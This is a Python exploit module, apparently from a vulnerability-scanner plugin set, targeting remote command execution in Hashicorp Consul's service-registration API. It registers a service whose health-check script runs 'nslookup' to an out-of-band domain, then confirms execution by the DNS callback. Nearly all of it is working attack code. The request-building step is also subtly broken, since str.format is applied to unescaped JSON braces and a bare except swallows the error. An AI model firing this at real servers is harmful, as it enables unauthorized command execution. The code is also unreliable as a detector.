import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hashicorp Consul Services Api RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/46074"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hashicorp", "rce", "oast", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/v1/agent/service/register"""
        method = "PUT"
        data = """{
  "ID": "{{randstr}}",
  "Name": "{{randstr}}",
  "Address": "127.0.0.1",
  "Port": 80,
  "check": {
    "script": "nslookup {oob_domain}",
    "interval": "10s",
    "Timeout": "86400s"
  }
}""".format(oob_domain=oob_domain)
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url